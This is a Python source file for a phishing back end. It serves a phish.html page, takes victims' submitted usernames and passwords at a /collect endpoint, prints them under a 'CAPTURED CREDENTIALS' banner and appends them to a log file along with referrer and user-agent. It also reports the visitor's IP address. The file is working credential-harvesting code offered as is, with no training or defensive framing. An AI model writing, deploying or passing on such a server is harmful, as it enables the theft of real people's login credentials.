from http.server import HTTPServer, SimpleHTTPRequestHandler
import json
import os

class PhishHandler(SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/collect':
            length = int(self.headers.get('Content-Length', 0))
            data = json.loads(self.rfile.read(length))
            print(f"\n{'='*50}")
            print(f"  CAPTURED CREDENTIALS")
            print(f"{'='*50}")
            print(f"  Username: {data['username']}")
            print(f"  Password: {data['password']}")
            print(f"  Referrer: {data['referrer']}")
            print(f"  User-Agent: {data['userAgent']}")
            print(f"  Time:       {data['timestamp']}")
            print(f"{'='*50}\n")

            # Also log to file
            with open('captures.log', 'a') as f:
                f.write(f"{data['timestamp']} | {data['username']} | {data['password']} | {data['referrer']} | {data['userAgent']}\n")

            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"status":"ok"}')
        else:
            self.send_response(404)
            self.end_headers()

    def do_GET(self):
        if self.path == '/ip':
            ip = self.client_address[0]
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'ip': ip}).encode())
        else:
            super().do_GET()

if __name__ == '__main__':
    port = 8080
    print(f"Phishing server running on http://localhost:{port}")
    print(f"Visit http://localhost:{port}/phish.html")
    HTTPServer(('0.0.0.0', port), PhishHandler).serve_forever()